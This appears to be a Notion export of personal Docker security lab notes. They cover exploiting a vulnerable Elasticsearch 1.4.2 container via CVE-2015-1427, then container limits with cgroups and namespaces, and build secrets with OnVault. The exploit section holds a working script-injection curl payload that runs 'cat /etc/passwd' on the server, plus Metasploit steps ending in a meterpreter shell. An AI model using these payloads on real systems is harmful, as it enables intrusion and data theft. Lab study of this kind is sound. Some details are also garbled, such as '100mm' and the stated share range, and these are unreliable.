{"children":[{"children":[],"uri":"https://www.notion.so/e134702e2ccb4da2b484c21ffa0bba1f","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["This lab was crazy one,  consciously using docker to exploit vulnerability and haha spawning reverse shell in metasploit gives same vibe of first time.\nNote for self: Learn and document exploits in golang using docker.  "]]},{"children":[],"uri":"https://www.notion.so/245bd7a76ccc457f9eae8645a459e609","type":"heading","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Hack ElasticSearch Container"]],"depth":2},{"children":[],"uri":"https://www.notion.so/17a77ab0dcf146df81fc3abc8919b8c0","type":"text","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Running applications vulnerable to security exploits can expose your system to hackers. This could result in downtime, data loss or important information disclosure that can have in-reversal impact on a company."]]},{"children":[],"uri":"https://www.notion.so/ef641f9f6d354fb4a04f0a401edd81e5","type":"heading","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Container Security"]],"depth":3},{"children":[],"uri":"https://www.notion.so/3605229a09144961b35c8f394ddcec27","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Docker drops certain Linux capabilities and blocks syscalls to add a default level of security."]]},{"children":[],"uri":"https://www.notion.so/de37df8d92844514b3533ddff70b513e","type":"code","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["# launch container\ndocker run -d -p 9200:9200 --name es benhall/elasticsearch:1.4.2"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/f18895107bb44ee0aac86ce1d26b1210","type":"heading","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Exploit Container via CVE-2015-1427"]],"depth":3},{"children":[],"uri":"https://www.notion.so/70f2839ba99045e0832f44b257120edf","type":"text","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Exploited Elasticsearch v1.4.2 search future"]]},{"children":[],"uri":"https://www.notion.so/12c019e62c694f8f8da2cc6671fa80ee","type":"code","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["# insert data, cURL to add a record.\ncurl -XPUT 'http://localhost:9200/twitter/user/kimchy1' -d '{\"name\" : \"shay banon\"}"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/626f1654c40d467289e7bfd3350268fd","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Here we using java to execute command to print os name."]]},{"children":[],"uri":"https://www.notion.so/98ebf53c69f9488bb6f60215c6e71970","type":"image","createdTime":1629571366159,"lastEditedTime":1629571366159,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F331b96d2-e7ee-4a4d-b68a-777a5020b5c6%2FUntitled.png?width=692&table=block&id=98ebf53c-69f9-488b-b6f6-0215c6e71970","caption":[],"width":692,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.21820809248554912,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/0c28c1833fc448bab86e75f8d8995a20","type":"code","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["# to read /etc/passwd\ncurl http://localhost:9200/_search?pretty -XPOST -d '{\"script_fields\": {\"myscript\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"cat /etc/passwd\\\").getText()\"}}}'"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/3007006cf2cb4dff8af6655035a03371","type":"image","createdTime":1629571366159,"lastEditedTime":1629571366159,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0e30dfae-cbf8-4c14-9175-7d38caf8e098%2FUntitled.png?width=1251&table=block&id=3007006c-f2cb-4dff-8af6-655035a03371","caption":[],"width":1251,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.451638689048761,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/b2d008d3257c4b4a989f214d8465d00d","type":"bulleted_list","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Docker security gives us huge advantages over running directly on the host."]]},{"children":[],"uri":"https://www.notion.so/fa8d7586ae714b4491311df9df47d6ea","type":"code","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["# Run Metasploit\ndocker run -it --link es:es --entrypoint bash benhall/metasploit\n# launch script\nchmod +x start.sh && ./start.sh\n# Under msf\nuse exploit/multi/elasticsearch/search_groovy_script\nset TARGET 0\nset RHOST es\nexploit\n# enjoy meterpreter"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/5b5913a281664dd39453f893c9b5fa9a","type":"divider","createdTime":1629571366159,"lastEditedTime":1629571366159},{"children":[],"uri":"https://www.notion.so/cf01ae7262084a5e981e4c1cee7811c6","type":"heading","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["CGroups and Namespaces"]],"depth":1},{"children":[],"uri":"https://www.notion.so/013f5d8169c246259ce322ac6d2bbec1","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Learning CGroups and Namespces to apply security restrictions to containers."]]},{"children":[],"uri":"https://www.notion.so/6e156af9fd0345d0b7514c94f0218d93","type":"code","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["# CGroups Example\n--cpu-shares\n--cpuset-cpus\n--memory-reservation\n--kernel-memory\n--blkio-weight\n--device-read-iops\n--device-write-iops\n\n# Namespaces Example\nCgroup   CLONE_NEWCGROUP Cgroup root dir\nIPC      CLONE_NEWIPC    System V ipc\nNetwork  CLONE_NEWNET    Network device, ports,etc\nMount    CLONE_NEWNS     Mount points\nPID      CLONE_NEWPID    Process IDs\nUser     CLONE_NEWUSER   User and group IDs\nUTS      CLONE_NEWUTS    Hostname and NIS domain name"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/ab53bfbdf33d42a89878eba2fd906356","type":"heading","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Define Memory Limits"]],"depth":2},{"children":[],"uri":"https://www.notion.so/1ac8f96636eb435d99846d3531c0ff0d","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["It protects system from potentially malicious users or applications aim to perform "],["Denial of System ",[["b",null]]],["applications via resource exhaustion. This limit applications from memory leaks or other programming bugs."]]},{"children":[],"uri":"https://www.notion.so/271b85c379a74375b635293b71065487","type":"code","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["# memory usage limits of contianer\ndocker run -d --name mb100 --memory 100mm alpine top\n\n# identify memory usage\ndocker stats --no-stream"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/425a5d8b52b043f6b9aec675018ed825","type":"heading","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Define CPU Shares"]],"depth":2},{"children":[],"uri":"https://www.notion.so/655495e6a6644538848696ca1b60e09e","type":"text","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["CPU limits are based on shares, shares are weight between how much processing time one process should get compared to another."]]},{"children":[],"uri":"https://www.notion.so/e9579528c86f4666a13aacfb9ce83bc8","type":"quote","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["One process will use all resources if CPU is idle, if second process comes then CPU will be shared based on weighting."]]},{"children":[],"uri":"https://www.notion.so/e77b488fa3274c18820a109515e4c5e8","type":"text","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["--cpu-shares",[["c",null]]],[" defines share between 0-768"]]},{"children":[],"uri":"https://www.notion.so/07f1246860ea49ebb109560cbcef86d3","type":"image","createdTime":1629571366159,"lastEditedTime":1629571366159,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf95dfef-069c-457b-bbe9-c9901dc97d27%2FUntitled.png?width=597&table=block&id=07f12468-60ea-49eb-b109-560cbcef86d3","caption":[],"width":597,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.5845896147403685,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/3be9a1ad74634ef3b8a8bb7cddc5fe02","type":"heading","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["Use Network Namespace"]],"depth":2},{"children":[],"uri":"https://www.notion.so/7b6ad34f59eb40228333e572023735bc","type":"code","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["# container are launched, network interface defined and create\n# unique IP addr and interface\ndocker run -it alpine ip addr show\n# process have access to host machine network interface\ndocker run -it --net=host alpine ip addr show\n# If the process listens on ports, they'll be listened on the host interface and mapped to the container."]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/0cd87605660a4523bce22c9523b1836b","type":"image","createdTime":1629571366159,"lastEditedTime":1629571366159,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fed3949de-bc76-4c0c-ae8c-3a99aa09ef16%2FUntitled.png?width=579&table=block&id=0cd87605-660a-4523-bce2-2c9523b1836b","caption":[],"width":579,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.3799654576856649,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/1a7c90880a7d4b9d8b6018e81c9dc631","type":"divider","createdTime":1629571366159,"lastEditedTime":1629571366159},{"children":[],"uri":"https://www.notion.so/d0d4768570104d48a0f34a3010c35f1b","type":"heading","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["Access .ssh keys during Docker build"]],"depth":1},{"children":[],"uri":"https://www.notion.so/ec385b711525482f981774e0b0cdd594","type":"code","createdTime":1629571366158,"lastEditedTime":1629571366158,"title":[["# create data to use in build within .ssh\ndocker run -it -v ~/.ssh:/vault/.ssh ubuntu /bin/bash -c \"echo pr0t3ct3d4A$$w0rd > /vault/.ssh/key \"\n# start build secrets server.\ndocker run -d -p 172.18.0.1:14242:3000 -v ~/.ssh:/vault/.ssh dockito/vault\n# run build, here it install onvault client\ncat Dockerfile-onvault\n--\nFROM ubuntu:14.04\nRUN apt-get update -y && \\\n      apt-get install -y curl && \\\n      curl -L $(ip route|awk '/default/{print $3}'):14242/ONVAULT > /usr/local/bin/ONVAULT && \\\n      chmod +x /usr/local/bin/ONVAULT\nENV REV_BREAK_CACHE=1\nRUN ONVAULT echo ENV: && env && echo TOKEN ENV && echo $TOKEN\nRUN ONVAULT ls -lha ~/.ssh/\nRUN ONVAULT cat ~/.ssh/key\n--\n# docker build output and onvault using it\ndocker build -f Dockerfile-onvault -t onvault-test ."]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/b6817363ba9941edb7c29228e556a8f7","type":"image","createdTime":1629571366159,"lastEditedTime":1629571366159,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F54b4f9b3-90ea-4162-aa8a-685a7ba71a2d%2FUntitled.png?width=1000&table=block&id=b6817363-ba99-41ed-b7c2-9228e556a8f7","caption":[],"width":1000,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.704,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/f073c82dd4b9415da2f4d3b23bbdb762","type":"code","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["# secret automatically removed by OnVault, to check\ndocker run -it onvault-test ls /root/.ssh"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/01d8e4d9f2d04d51b7a7a65e3c731f0a","type":"text","createdTime":1629571366159,"lastEditedTime":1629571366159,"title":[["This allows to use secrets as part of our build, but never expose them within the image."]]}],"uri":"https://www.notion.so/412913c7a1bb4383a20eefe296623281","type":"page","createdTime":1629571366139,"lastEditedTime":1629571366139,"title":[["Docker Security"]],"icon":"🧭","fullWidth":false,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"98uZ":[["Hands on ElasticSearch container hacking, Cgroups and Namespace and using Docker OnVault."]],":H`m":[["Yes"]],"{iD?":[["Docker"]],"|Ay0":[["post"]]}}